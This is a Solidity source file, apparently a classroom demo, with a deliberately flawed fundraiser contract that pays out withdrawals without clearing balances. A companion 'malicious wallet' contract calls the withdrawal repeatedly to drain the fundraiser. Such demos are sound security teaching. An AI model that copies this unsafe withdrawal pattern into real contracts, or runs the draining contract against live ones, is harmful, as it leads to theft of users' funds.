contract VulnarableFundraiser{

   mapping(address=>uint) balances;

   // VULNERABLE
   function withdrawAllMyCoins(){
      // send back funds to the msg.sender

      uint withdrawAmount = balances[msg.sender];
      MailiciousWallet wallet = MailiciousWallet(msg.sender);
      //wallet.payout(withdrawAmount);
      
      wallet.send(withdrawAmount);
      //balances[msg.sender] = 0;
      
      
      
      // Dit is de vulnerability......eerst moet balans gedaan worden en dan pas payout!!!
      //balances[msg.sender] -= withdrawAmount;
   }
   
   event show(string message1,uint message2);

   function laatSaldoZien(){
       show("balance is: ",balances[msg.sender]);
   }

   function getBalance() constant returns(uint){
      return this.balance;
   }

   function contribute() payable{
      balances[msg.sender] += msg.value;
   }

   function() payable{
   }
}


contract MailiciousWallet{
  
   mapping(address=>uint) balances; 
  
   VulnarableFundraiser fundraiser;
   uint recursie = 3;


   function initRecursie(uint newvalue) {
      recursie = newvalue;
   }


   function MailiciousWallet(address fundraiserAddress) payable{
      fundraiser = VulnarableFundraiser(fundraiserAddress);
   }

   function laatSaldoZien(){
      fundraiser.laatSaldoZien();
   }


   function contribute(uint amount){
      fundraiser.contribute.value(amount)();
   }

   function withdraw(){
       while(recursie>1){
          recursie--;
          fundraiser.withdrawAllMyCoins();
       }
   }

   function getBalance() constant returns (uint){
      return this.balance;
   }



   function() payable{
   }

}
